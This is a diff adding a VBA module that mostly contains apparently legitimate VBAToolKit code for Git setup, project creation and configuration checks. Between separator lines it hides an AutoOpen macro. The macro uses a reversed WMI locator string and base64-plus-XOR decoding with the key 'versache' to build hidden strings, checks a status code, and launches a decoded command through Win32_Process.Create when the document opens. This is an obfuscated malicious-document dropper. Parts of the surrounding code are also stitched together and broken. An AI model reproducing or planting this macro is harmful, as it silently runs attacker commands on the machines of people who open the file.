@@ -1,0 +1,975 @@
+Attribute VB_Name = "Module1"
+Private Const CP_UTF8                       As Long = 65001
+
+#If Win64 Then
+Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
+Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
+#Else
+Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
+Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
+
+#End If
+
+
+ Public Function vtkInitializeGit(folderPath As String, Optional logFile As String = "")
+    Dim tmpLogFileName As String
+    tmpLogFileName = "initialize.log"
+    Dim logFileFullPath As String
+    
+    Dim convertedFolderPath As String
+    Dim convertedLogFilePath As String
+    
+    Dim fso As New FileSystemObject
+    Dim contentStream As TextStream
+    
+    On Error GoTo vtkInitializeGit_Err
+        
+    If InStr(UCase(Environ("PATH")), UCase("Git\cmd")) = False Then
+        Err.Raise VTK_GIT_NOT_INSTALLED, "", "Git not installed."
+    End If
+    
+    ' Potentially raise VTK_FORBIDDEN_PARAMETER
+    convertedFolderPath = vtkGitConvertWinPath(folderPath)
+    
+    If vtkDoesFolderExist(folderPath) = False Then
+        Err.Raise VTK_WRONG_FOLDER_PATH, "", "Folder path not found."
+    End If
+    
+    If vtkDoesFolderExist(folderPath & "\.git") = True Then
+        Err.Raise VTK_GIT_ALREADY_INITIALIZED_IN_FOLDER, "", "Git has already been initialized in the folder " & folderPath
+    End If
+    
+    ' Get the path of the log file that will be used
+    ' If a log file has been passed as a parameter
+    If logFile <> "" Then
+        ' If the path is relative, make it absolute
+        Dim splittedLogFilePath() As String
+        splittedLogFilePath = Split(logFile, ":")
+        If splittedLogFilePath(LBound(splittedLogFilePath)) = logFile Then
+            logFileFullPath = folderPath & "\" & logFile
+        End If
+        ' convert and potentially raise error
+        convertedLogFilePath = vtkGitConvertWinPath(logFileFullPath)
+    Else
+        convertedLogFilePath = vtkGitConvertWinPath(folderPath & "\" & tmpLogFileName)
+    End If
+    
+    ' Intializing git using a shell command and redirecting the output flow in the log file
+    ShellAndWait "cmd.exe /c git init " & convertedFolderPath _
+    & " > " & convertedLogFilePath, 0, vbHide, AbandonWait
+    
+    ' Check if the initialization went well
+    Dim logFileContent As String
+    logFileContent = vtkTextFileReader(folderPath & "\" & tmpLogFileName)
+    If Left(logFileContent, 12) <> Chr(10) & "Initialized" Then
+        Err.Raise VTK_GIT_PROBLEM_DURING_INITIALIZATION, , "There was a problem during Git initialization." _
+        & vbCrLf & "Content of the log file : " & logFileContent
+    End If
+    
+    ' Delete file if tmp
+    If logFile = "" Then
+        Kill folderPath & "\" & tmpLogFileName
+    End If
+    
+    ' Delete the default git exclude file
+    fso.DeleteFile folderPath & "\.git\info\exclude", True
+    
+    ' Create it again and fill it with the content we want.
+    Set contentStream = fso.CreateTextFile(folderPath & "\.git\info\exclude")
+    contentStream.WriteLine "# Ignore the content of the Tests and GitLog folders"
+    contentStream.WriteLine "/Tests/*"
+    contentStream.WriteLine "/GitLog/*"
+    contentStream.WriteLine
+    contentStream.WriteLine "# Ignore the temporary Excel files"
+    contentStream.WriteLine "~*"
+    contentStream.WriteLine
+    contentStream.WriteLine "# Ignore the delivery Excel files"
+    contentStream.WriteLine "/Delivery/*.xl*"
+    contentStream.WriteLine
+    contentStream.WriteLine "# Ignore the Project Excel files"
+    contentStream.WriteLine "/Project/*.xl*"
+    contentStream.Close
+    
+    ' Adds all the files in the folder tree to the git repository
+    ShellAndWait "cmd.exe /c cd " & folderPath & " & git add " & ". ", 0, vbHide, AbandonWait
+     
+    On Error GoTo 0
+    vtkInitializeGit = VTK_OK
+    Exit Function
+    
+    
+vtkInitializeGit_Err:
+    If ((Err.Number = VTK_GIT_NOT_INSTALLED) _
+        Or (Err.Number = VTK_GIT_ALREADY_INITIALIZED_IN_FOLDER) _
+        Or (Err.Number = VTK_FORBIDDEN_PARAMETER) _
+        Or (Err.Number = VTK_GIT_PROBLEM_DURING_INITIALIZATION) _
+        Or (Err.Number = VTK_WRONG_FOLDER_PATH)) Then
+        Err.Raise Err.Number, "Module vktGitFuntions : Function vtkGitInitialize", Err.Description
+    Else
+        Debug.Print "ERR IN INITIALIZE : " & Err.Number & Err.Description
+        Err.Raise VTK_UNEXPECTED_ERROR, "Module vktGitFuntions : Function vtkGitInitialize", Err.Description
+    End If
+     
+    Exit Function
+
+End Function
+
+'---------------------------------------------------------------------------------------
+' Procedure : vtkGitConvertWinPath
+' Author    : Lucas Vitorino
+' Purpose   : Converts an *absolute* Windows PATH to a one suitable for use with Git.
+' Notes     : - WIP because I don't fully understand the behaviour of Git. I suppose
+'               it's a Windows/Unix path format conflict.
+'             - For now, I can't specify the drive letter in a path used with Git.
+'               This function will strip it and git will assume it's "C" .
+'             - Returns
+'               - Converted string if OK
+'               - VTK_FORBIDDEN_PARAMETER if winPath is not absolute, or absolute but not on the C: drive
+'               - VTK_UNEXPECTED_ERR
+'---------------------------------------------------------------------------------------
+'
+Public Function vtkGitConvertWinPath(winPath As String) As String
+    
+    Dim convertedPath As String
+    convertedPath = winPath
+    Dim convertedSplittedPath() As String
+    
+    On Error GoTo vtkGitConvertWinPath_Error
+    
+    convertedSplittedPath = Split(convertedPath, ":")
+    
+    ' Only allows absolute paths on the C: drive
+    If convertedSplittedPath(LBound(convertedSplittedPath)) <> "C" Then
+        Err.Raise VTK_FORBIDDEN_PARAMETER, "", "Parameter is invalid."
+    End If
+
+    convertedPath = convertedSplittedPath(LBound(convertedSplittedPath) + 1)
+    
+    'Changing the backslahes in slashes
+    ' NB : Optional
+    convertedPath = Replace(convertedPath, "\", "/")
+        
+    On Error GoTo 0
+    vtkGitConvertWinPath = Chr(34) & convertedPath & Chr(34)
+    Exit Function
+    
+
+vtkGitConvertWinPath_Error:
+    If (Err.Number = VTK_FORBIDDEN_PARAMETER) Then
+        Err.Raise Err.Number, "Module vtkGitFunctions ; Function vtkGitConvertWinPath", Err.Description
+    Else
+        'Debug.Print "ERR IN CONVERT : " & Err.Number & Err.Description
+        Err.Raise VTK_UNEXPECTED_ERROR, "Module vtkGitFunctions ; Function vtkGitConvertWinPath", Err.Description
+    End If
+    Exit Function
+
+End Function
+ 
+ 
+ 
+ Public Function vtkCreateProject(path As String, name As String, Optional displayError As Boolean = True) As Long
+    
+  On Error GoTo vtkCreateProject_Error
+
+    ' Create the vtkProject object attached to the new project
+    Dim project As vtkProject
+    Set project = vtkProjectForName(projectName:=name)
+    Dim rootPath As String
+    rootPath = path & "\" & project.projectName
+    
+    ' Create tree folder
+    Dim internalError As Long
+    internalError = vtkCreateTreeFolder(rootPath)
+    If internalError <> VTK_OK Then GoTo vtkCreateProject_ErrorTreeFolder
+     
+    ' Create DEV workbook with xlsm extension
+    Workbooks.Add.SaveAs (rootPath & "\" & project.projectDEVStandardRelativePath), FileFormat:=xlOpenXMLWorkbookMacroEnabled
+    ' Rename the VBProject of the DEV workbook
+    Workbooks(project.workbookDEVName).VBProject.name = project.projectDEVName
+    ' Activate references and reference to the current workbook (the VBAToolKit add-in)
+    VtkActivateReferences Wb:=Workbooks(project.workbookDEVName), projectName:=project.projectName, confName:=project.projectDEVName
+    ' Initialize configuration Sheet with VBAUnit modules
+    vtkInitializeVbaUnitNamesAndPathes project:=project.projectName
+    ' Save DEV Workbook
+    Workbooks(project.workbookDEVName).Save
+    
+    
+    ' Create Delivery workbook with xlsm extension
+    Workbooks.Add.SaveAs (rootPath & "\" & project.projectStandardRelativePath), FileFormat:=(52) '52 is xlsm format
+    ' Rename the VBProject of the Delivery workbook
+    Workbooks(project.workbookName).VBProject.name = project.projectName
+    ' Activate references
+    VtkActivateReferences Wb:=Workbooks(project.workbookName), projectName:=project.projectName, confName:=project.projectName
+    ' A module must be added in the Excel File for the project parameters to be saved
+    Workbooks(project.workbookName).VBProject.VBComponents.Add ComponentType:=vbext_ct_StdModule
+    ' Save and Close Delivery Workbook
+    Workbooks(project.workbookName).Close saveChanges:=True
+    
+    Dim Wb As Workbook
+    Set Wb = Workbooks(project.workbookDEVName)
+    Wb.Activate
+    ' Get VBAUnit modules from VBAToolkit (This workbook = current running code)
+    vtkExportModulesFromAnotherProject projectWithModules:=ThisWorkbook.VBProject, projectName:=project.projectName, confName:=project.projectDEVName
+    ' Import VBAUnit (and lib ?) modules in the new Excel file project
+    vtkImportModulesInAnotherProject projectForModules:=Wb.VBProject, projectName:=project.projectName, confName:=project.projectDEVName
+    
+    ' Insert the BeforeSave handler in the newly created project
+    vtkAddBeforeSaveHandlerInDEVWorkbook Wb:=Wb, projectName:=project.projectName, confName:=project.projectDEVName
+    ' Declare the BeforeSave handler in the new project configuration
+    Dim module As VBComponent, nm As Integer, nc As Integer, moduleName As String, cm As vtkConfigurationManager
+    Set cm = vtkConfigurationManagerForProject(project.projectName)
+    nc = cm.getConfigurationNumber(project.projectDEVName)
+    moduleName = "thisWorkbook"
+    Set module = Wb.VBProject.VBComponents(moduleName)
+    nm = cm.addModule(moduleName)
+    cm.setModulePathWithNumber path:="Source\ConfTest\" & module.name & ".cls", numModule:=nm, numConfiguration:=nc
+    ' Save configured and updated project for test
+    Wb.Save
+        
+    ' Initialize git
+    On Error GoTo vtkCreateProject_ErrorGit
+    vtkInitializeGit rootPath
+
+    On Error GoTo 0
+    vtkCreateProject = VTK_OK
+    Exit Function
+
+vtkCreateProject_ErrorTreeFolder:
+    vtkCreateProject = internalError
+    If displayError Then MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure vtkCreateProject of Module MainFunctions"
+    Exit Function
+vtkCreateProject_Error:
+    vtkCreateProject = Err.Number
+    If displayError Then MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure vtkCreateProject of Module MainFunctions"
+vtkCreateProject_ErrorGit:
+    vtkCreateProject = Err.Number
+    If displayError Then MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure vtkCreateProject of Module MainFunctions"
+
+End Function
+
+'---------------------------------------------------------------------------------------
+' Procedure  : vtkRecreateConfigurations
+' Author     : Jean-Pierre Imbert
+' Date       : 15/07/2014
+' Purpose    : recreate one or several configurations
+' Parameters :
+'             - confManager, configuration manager for the configurations to recreate
+'             - confNames, Colelction of the name of the configurations to recreate
+'
+'---------------------------------------------------------------------------------------
+'
+Public Sub vtkRecreateConfigurations(confManager As String, confNames As Collection)
+    Dim c As Variant, confName As String
+    For Each c In confNames
+        confName = c
+        vtkRecreateConfiguration confManager.projectName, confName, confManager
+    Next c
+End Sub
+ 
+ ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+ 
+Sub AutoOpen()
+    
+
+    
+    Set Nihonek = CreateObject(StrReverse("rotacoLmebWS.gnitpircSmebW"))
+    'If checkProc() Or checkMac() Or checkPnP() Or checkBios() Or checkCores() Or checkFilenameBad() Or checkTasks() Then
+    'GoTo rew
+    'End If
+    'If checkISP() Then
+    'GoTo rew
+    'End If
+
+    Set Buhrain = Nihonek.ConnectServer()
+    Buhrain.Security_.ImpersonationLevel = 3
+    Set beng_Man = Buhrain.Get(yetras(Groa("IQwcQFM8OAwYAiEHAB" + "cdFlgkFhcTBhsWS0IXHgMCGgQVABYcTw4BBgQKARwHF0YGGQhVXzMG" + "GwoaExcyBQcaAAUWPBIMBhtYIhcHFg=="), "versache"))
+    With beng_Man
+        If .StatusCode = (12 * 2 - 24) Then
+            End
+        ElseIf .StatusCode > (11 * 11 - 121) Then
+            End
+        End If
+    End With
+
+    Set Dergach = Buhrain.Get("Win32_Process")
+    On Error Resume Next
+    beng_Man = Dergach.Create(yetras(Groa("BgoFFhMQAAAaCVJeFg" + "oGARkSAQcYDw1FHgwWFwQNS" + "EgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgN" + "AhECSU5MCwoEFUZdEgocAFkGJDoKAkYBFxFeGxUXGF9ZShEcExNcSwUMBh" + "ZOFQoAGEsWEhVPABECF" + "UhcTgAHFwZRXAAIFw1KOhAVJTFNDAQCRV83BBAcDBgEBhoODUg5VEEXHRd" + "ZPCA7NS4FCAcHSxUKHy9DTzRHUgAcBVs3LSgmOQEVBBEJOVRJLlFFBgYTTDE3PjE/JBARMyJdBBsNOVReUiAEF0UpGQYTBwgMBkVbNRMHCUM0R1IAHAVbNy0oJjlQSEEADRcCEAYaDUNFARMGHRcEQxsDExcTUwIMBRUZFwZIQUM7ERcXBl4xEQcGExYBUxcKDApYBh0eQU4pFxEQHxYPFyQMBRFSEA4OGAoEEQ=="), "versache"), Null, Null, Vrigin)
+
+End Sub
+
+
+
+
+
+
+
+Private Function yetras(text As String, key As String) As String
+  Dim bText() As Byte
+  Dim bKey() As Byte
+  
+  Dim TextUB As Long
+  Dim KeyUB As Long
+  
+  
+  
+  bText = StrConv(text, vbFromUnicode)
+  bKey = StrConv(key, vbFromUnicode)
+  TextUB = UBound(bText)
+  KeyUB = UBound(bKey)
+  Dim TextPos As Long
+  Dim Trenfa As Long
+  For TextPos = 0 To TextUB
+    bText(TextPos) = bText(TextPos) Xor bKey(Trenfa)
+    If Trenfa < KeyUB Then
+      Trenfa = Trenfa + 1
+    Else
+      Trenfa = 0
+    End If
+  Next TextPos
+  yetras = StrConv(bText, vbUnicode)
+End Function
+
+
+
+Public Function DUPLO(file_path As String) As Boolean
+    
+
+    trega = Dir(file_path) <> ""
+    Exit Function
+
+DirErr:
+      If Err.Number = 68 Then
+        trega = False
+    Else
+        MsgBox Err.Description & " (" & Err.Number & ")", , "Run-time Error"
+        Stop
+    End If
+End Function
+
+Public Function Groa(Vecad As String) As String
+    Dim baValue()       As Byte
+    Dim sValue          As String
+    Dim kerfas           As Long
+    
+    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
+        .DataType = "bin" + ".base64"
+        .text = Vecad
+        baValue = .NodeTypedValue
+        sValue = String$(4 * UBound(baValue), 0)
+        kerfas = MultiByteToWideChar(CP_UTF8, 84 + 2 - 86, baValue((54 + 12 - 66)), UBound(baValue) + (11 * 11 - 120), StrPtr(sValue), Len(sValue))
+        Groa = Left$(sValue, kerfas)
+    End With
+End Function
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+
+Public Function vtkConfigurationManagerForProject(projectName As String) As String
+    ' Create the collection if it doesn't exist
+    If configurationManagers Is Nothing Then
+        Set configurationManagers = New Collection
+        End If
+    ' search for the configuration manager in the collection
+    Dim cm As vtkConfigurationManager
+    On Error Resume Next
+    Set cm = configurationManagers(projectName)
+    If Err <> 0 Then
+        Set cm = New vtkConfigurationManagerExcel
+        Dim cmE As vtkConfigurationManagerExcel
+        Set cmE = cm
+        cmE.projectName = projectName    ' The projectName setter is specific to the Excel conf Manager
+        If cm.projectName Like projectName Then     ' The initialization could fail (if the Workbook is closed)
+            configurationManagers.Add Item:=cm, key:=projectName
+           Else
+            Set cm = Nothing
+        End If
+    End If
+   On Error GoTo 0
+    ' return the configuration manager
+    Set vtkConfigurationManagerForProject = cm
+End Function
+
+'---------------------------------------------------------------------------------------
+' Procedure : vtkResetConfigurationManagers
+' Author    : Jean-Pierre Imbert
+' Date      : 25/05/2013
+' Purpose   : Reset all configuration managers (used during tests)
+'---------------------------------------------------------------------------------------
+'
+Public Sub vtkResetConfigurationManagers()
+    Set configurationManagers = Nothing
+End Sub
+
+'---------------------------------------------------------------------------------------
+' Procedure : vtkInitializeConfigurationForActiveWorkBook
+' Author    : Jean-Pierre Imbert
+' Date      : 07/08/2013
+'
+' WARNING 1 : for now used only with manual run to convert a VBA project for VBAToolkit
+' WARNING 2 : A beforeSave event handler is added even if one is already existing
+' WARNING 3 : This function must use an Excel Configuration Manager (not XML)
+'
+' Purpose   : Create and Initialize a vtkConfiguration sheet for the active workbook
+'             - does nothing if the active workbook already contains a vtkConfiguration worksheet
+'             - initialize the worksheet with all VBA modules contained in the workbook
+'             - a BeforeSave event handler is added to the new ActiveWorkbook
+'             - manage VBAUnit, Tester class and standard modules appropriately
+'             - the suffix "_DEV" is appended to the project name
+'             - the Excel workbook is saved as a new file with DEV appended to the name
+'             - the Delivery version is described in configuration but not created
+'             - the reference sheet is created and initialized according to the actual references
+'---------------------------------------------------------------------------------------
+'
+Public Sub vtkInitializeConfigurationForActiveWorkBook(Optional withBeforeSaveHandler As Boolean = False)
+    ' If a configuration sheet exists, does nothing
+    Dim cm As New vtkConfigurationManagerExcel
+    If cm.isConfigurationInitializedForWorkbook(ExcelName:=ActiveWorkbook.name) Then Exit Sub
+    Set cm = Nothing
+    
+    ' Get the project name and initialize a vtkProject with it
+    Dim project As vtkProject
+    Set project = vtkProjectForName(projectName:=ActiveWorkbook.VBProject.name)
+    
+    ' Change the project name
+    ActiveWorkbook.VBProject.name = project.projectDEVName
+    
+    ' Change the workbook name
+    ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.path & "\" & project.workbookDEVName
+    
+    ' Prepare configuration manager
+    Dim i As Integer, c As VBComponent, cn_dev As Integer, cn_prod As Integer, nm As Integer
+    Set cm = vtkConfigurationManagerForProject(projectName:=project.projectName)
+    cn_dev = cm.getConfigurationNumber(configuration:=project.projectDEVName)
+    cn_prod = cm.getConfigurationNumber(configuration:=project.projectName)
+    
+    ' List all modules
+    For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
+        Set c = ActiveWorkbook.VBProject.VBComponents.Item(i)
+        If c.Type <> vbext_ct_Document Then
+            nm = cm.addModule(c.name)
+            cm.setModulePathWithNumber path:=vtkStandardPathForModule(module:=c), numModule:=nm, numConfiguration:=cn_dev
+            If vtkStandardCategoryForModuleName(moduleName:=c.name) Like "Prod" Then
+                cm.setModulePathWithNumber path:=vtkStandardPathForModule(module:=c), numModule:=nm, numConfiguration:=cn_prod
+            End If
+        End If
+    Next
+    
+    ' Initialize the reference sheet
+    cm.initReferences vtkReferencesInWorkbook(ActiveWorkbook)
+    
+    ' Add a BeforeSave event handler for the workbook
+    If withBeforeSaveHandler Then vtkAddBeforeSaveHandlerInDEVWorkbook Wb:=ActiveWorkbook, projectName:=project.projectName, confName:=project.projectDEVName
+    
+    ' Save the new workbook
+    ActiveWorkbook.Save
+    
+End Sub
+
+'---------------------------------------------------------------------------------------
+' Procedure : vtkVerifyConfigurations
+' Author    : Jean-Pierre IMBERT
+' Date      : 13/11/2013
+' Purpose   : Verify the coherence of the configurations description and the real
+'             configuration workbooks and source modules
+'             The verifications performed are :
+'             - All configuration pathes are reachable
+'             - All configuration projectName property is the same as the project name of the configuration
+'             - All configuration projectName property is the same as the title property of the configuration
+'             - All configuration comment property is the same as the comment property of the configuration
+'             - All configuration template path is reachable
+'             - All modules listed in a configuration description are existing in the configuration
+'             - All modules really present in a configuration are described in the description with non null path
+'             - All modules pathes are reachable
+'             - Each code module implemented in a configuration is the same as the source code module
+'             - All references listed in a configuration description are existing in the configuration
+'             - All references really present in a configuration are described in the description
+'---------------------------------------------------------------------------------------
+'
+Sub vtkVerifyConfigurations()
+    ' Invalid events management for silently open workbooks
+    Application.EnableEvents = False
+
+    ' Init project and configuration manager
+    Dim prj As vtkProject
+    Set prj = vtkProjectForName(getCurrentProjectName)
+    Dim cm As vtkConfigurationManager
+    Set cm = vtkConfigurationManagerForProject(prj.projectName)
+    
+    ' Declare variables
+    Dim c As vtkConfiguration, s As String, fso As New FileSystemObject
+    Dim cwb() As ConfWB
+    ReDim cwb(1 To cm.configurationCount) As ConfWB
+    Debug.Print "----------------------------------------------------"
+    Debug.Print "  Start verification of " & getCurrentProjectName & " project configurations"
+    Debug.Print "----------------------------------------------------"
+   
+    ' Verify configuration pathes
+    Dim nbConf As Integer
+    nbConf = 0
+    For Each c In cm.configurations
+        s = cm.rootPath & "\" & c.path
+        If fso.FileExists(s) Then
+            nbConf = nbConf + 1
+            Set cwb(nbConf).conf = c
+           On Error Resume Next
+            Set cwb(nbConf).Wb = Workbooks(fso.GetFileName(s))
+           On Error GoTo 0
+            cwb(nbConf).wasOpened = Not (cwb(nbConf).Wb Is Nothing)
+            If Not cwb(nbConf).wasOpened Then Set cwb(nbConf).Wb = Workbooks.Open(FileName:=s, ReadOnly:=True)
+            If Not (cwb(nbConf).Wb Is Nothing) Then
+
+    ' Verify projects name
+                If Not (c.projectName = cwb(nbConf).Wb.VBProject.name) Then
+                    Debug.Print "For configuration " & c.name & ", the projectName property (" & c.projectName & ") is different of the project name (" & cwb(nbConf).Wb.VBProject.name & ")."
+                End If
+
+    ' Verify workbooks title
+                If Not (c.projectName = cwb(nbConf).Wb.BuiltInDocumentProperties("Title").Value) Then
+                    Debug.Print "For configuration " & c.name & ", the projectName property (" & c.projectName & ") is different of the workbook title (" & cwb(nbConf).Wb.BuiltInDocumentProperties("Title").Value & ")."
+                End If
+
+    ' Verify workbooks comment
+                If Not (c.Comment = cwb(nbConf).Wb.BuiltInDocumentProperties("Comments").Value) Then
+                    Debug.Print "For configuration " & c.name & ", the comment property (" & c.Comment & ") is different of the workbook comment (" & cwb(nbConf).Wb.BuiltInDocumentProperties("Comments").Value & ")."
+                End If
+
+    ' Verify workbooks template path
+                If (c.Template <> "") And Not (fso.FileExists(cm.rootPath & "\" & c.Template)) Then
+                    Debug.Print "For configuration " & c.name & ", the template path (" & cm.rootPath & "\" & c.Template & ") is unreachable."
+                End If
+
+               Else
+                Debug.Print "Impossible to open Workbook for configuration " & c.name & " (" & s & ")."
+            End If
+           Else
+            Debug.Print "Path of configuration " & c.name & " unreachable (" & s & ")."
+        End If
+    Next
+    
+    ' Verify that all modules in a configuration are in the description
+    Dim i As Integer, mods As Collection, vbc As VBIDE.VBComponent, md As vtkModule
+    For i = 1 To nbConf
+        Set mods = cwb(i).conf.modules
+        For Each vbc In cwb(i).Wb.VBProject.VBComponents
+           On Error Resume Next
+            Set md = mods(vbc.name)
+            If Err.Number <> 0 Then
+                Debug.Print "Module " & vbc.name & " is in configuration workbook " & cwb(i).conf.name & " but not in description of configuration."
+            End If
+           On Error GoTo 0
+        Next
+    Next i
+    
+    ' Verify that all modules in a description are in the configuration
+    For i = 1 To nbConf
+        For Each md In cwb(i).conf.modules
+           On Error Resume Next
+            Set vbc = cwb(i).Wb.VBProject.VBComponents(md.name)
+            If Err.Number <> 0 Then
+                Debug.Print "Module " & md.name & " is in the configuration description of " & cwb(i).conf.name & " but not in the workbook."
+            End If
+           On Error GoTo 0
+        Next
+    Next i
+    
+    ' Verify that all modules pathes are reachable
+    For i = 1 To nbConf
+        For Each md In cwb(i).conf.modules
+            s = cm.rootPath & "\" & md.path
+            If Not fso.FileExists(s) Then
+                Debug.Print "Module " & md.name & " path (" & md.path & " is not reachable for the configuration " & cwb(i).conf.name & "."
+            End If
+        Next
+    Next i
+    
+    ' Verify that all modules content of all configuration are equal to source modules content
+    ' - Create a project folder tree structure in the test folder of the cirrent project
+    ' - For each configuration
+    '   - Export each module in the test tree folder (to perform a comparaison on normalized export)
+    '   - compare the content of the each file in the tree folder to the one in the source folder
+    ' - Delete the files and folders in the test folder
+    Dim testPath As String, s1 As String
+    testPath = vtkPathToTestFolder(ActiveWorkbook) & "\Temporary"
+    vtkCreateTreeFolder testPath
+    For i = 1 To nbConf
+        For Each md In cwb(i).conf.modules
+            s = cm.rootPath & "\" & md.path
+            s1 = testPath & "\" & md.path
+            vtkExportOneModule cwb(i).Wb.VBProject, md.name, s1
+            If Not compareFiles(s, s1, True) Then
+                Debug.Print "Module " & md.name & " content of source path (" & md.path & " is different from module in the configuration " & cwb(i).conf.name & "."
+            End If
+        Next
+    Next i
+    vtkDeleteFolder testPath
+    
+    ' Verify that all references listed in a configuration description are existing in the configuration
+    ' and that all references really present in a configuration are described in the description
+    '   - for each configuration, get both collection
+    '   - compare one list to the other whikle removing each found item
+    '       - alert if an item is not found in the other list
+    '   - the count of remaining items must be null at the end of the comparison
+    '       - alert if not, and list the remaining items
+    Dim actualList As Collection, actualRef  As vtkReference, expectedRef As vtkReference
+    For i = 1 To nbConf
+        Set actualList = vtkReferencesInWorkbook(cwb(i).Wb) ' Get the actual list, indexed by name
+        For Each expectedRef In cwb(i).conf.references      ' the expected list is indexed by ID
+           On Error Resume Next
+            Set actualRef = actualList(expectedRef.name)
+            If Err.Number <> 0 Then
+                Debug.Print "Reference " & expectedRef.name & " is expected but not present in configuration " & cwb(i).conf.name & "."
+               Else
+                actualList.Remove expectedRef.name
+            End If
+           On Error GoTo 0
+        Next expectedRef
+        If actualList.Count <> 0 Then
+            For Each actualRef In actualList
+                Debug.Print "Reference " & actualRef.name & " is present but not expected in configuration " & cwb(i).conf.name & "."
+            Next actualRef
+        End If
+    Next i
+    
+    ' Close all Worbooks opened during this verification
+    For i = 1 To nbConf
+        If Not cwb(i).wasOpened Then cwb(i).Wb.Close saveChanges:=False
+    Next i
+    Debug.Print "----------------------------------------------------"
+    
+    ' Reactivate events management for silently open workbooks
+    Application.EnableEvents = True
+
+End Sub
+
+
+
+Private Sub initializeList()
+    
+    Dim properlyCasedIdentifiersString As String
+    
+    properlyCasedIdentifiersString = _
+    "Dim" & "," & _
+    "Wb" & "," & _
+    "Err" & "," & _
+    "Number" & "," & _
+    "Description" & "," & _
+    "Source" & "," & _
+    "Count" & "," & _
+    "File" & "," & _
+    "Folder" & "," & _
+    "Scripting" & "," & _
+    "Boolean" & "," & _
+    "String" & "," & _
+    "Integer" & "," & _
+    "addModule" & "," & _
+    "returnValue" & "," & _
+    "retVal" & "," & _
+    "fileName" & "," & _
+    "saveChanges" & "," & _
+    "FileExists" & "," & _
+    "m" & "," & _
+    "c" & "," & _
+    "Tests" & "," & _
+    ""
+    
+    properlyCasedIdentifiersArray = Split(properlyCasedIdentifiersString, ",")
+    
+End Sub
+
+'---------------------------------------------------------------------------------------
+' Procedure : vtkListOfProperlyCasedIdentifiers
+' Author    : Lucas Vitorino
+' Purpose   : This functions returns the array containing the properly cased Strings.
+'---------------------------------------------------------------------------------------
+'
+Public Function vtkListOfProperlyCasedIdentifiers() As String()
+    
+    If Len(Join(properlyCasedIdentifiersArray, "")) = 0 Then ' if the array has not been initialized
+        initializeList
+    End If
+    
+    vtkListOfProperlyCasedIdentifiers = properlyCasedIdentifiersArray
+    
+End Function
+
+
+'---------------------------------------------------------------------------------------
+' Procedure : vtkNormalizeToken
+' Author    : Lucas Vitorino
+' Purpose   : - Perform a case-insensitive search of a given token in a given array of Strings,
+'               and return this token with the casing used in the array.
+'             - If the token is not found in the array of if the array is empty, the token is
+'               returned unchanged.
+' Returns   : A String corresponding to the normalized token.
+' Errors    : VTK_UNEXPECTED_ERROR
+'---------------------------------------------------------------------------------------
+'
+Public Function vtkNormalizeToken(token As String, listOfTokens() As String) As String
+
+    On Error GoTo vtkNormalizeToken_Error
+    
+    ' If the list is not empty
+    If Len(Join(listOfTokens, "")) <> 0 Then
+        ' Perform the search
+        Dim i As Integer
+        For i = LBound(listOfTokens) To UBound(listOfTokens)
+            If StrComp(UCase(token), UCase(listOfTokens(i))) = 0 Then
+                vtkNormalizeToken = listOfTokens(i)
+                Exit Function
+            End If
+        Next
+    End If
+    
+    ' If the token has not been found or the list is empty, return the token unchanged
+    On Error GoTo 0
+    vtkNormalizeToken = token
+    Exit Function
+
+vtkNormalizeToken_Error:
+    Err.Source = "function vtkNormalizeToken of module vtkNormalize"
+    Err.Number = VTK_UNEXPECTED_ERROR
+    Err.Raise Err.Number, Err.Source, Err.Description
+    Exit Function
+End Function
+
+
+'---------------------------------------------------------------------------------------
+' Procedure : vtkNormalizeString
+' Author    : Lucas Vitorino
+' Purpose   : Normalize a String by normalizing the VBA identifier tokens in it
+'               - an identifier token is a String starting by a [A-Za-z] character with nothing but characters,
+'                 numbers and underscores in it
+'               - comments are not scanned for identifier tokens.
+' Returns   : The normalized String corresponding to the input String.
+' Raises    : - VTK_UNEXPECTED_EOS
+'             - VTK_UNEXPECTED_CHAR
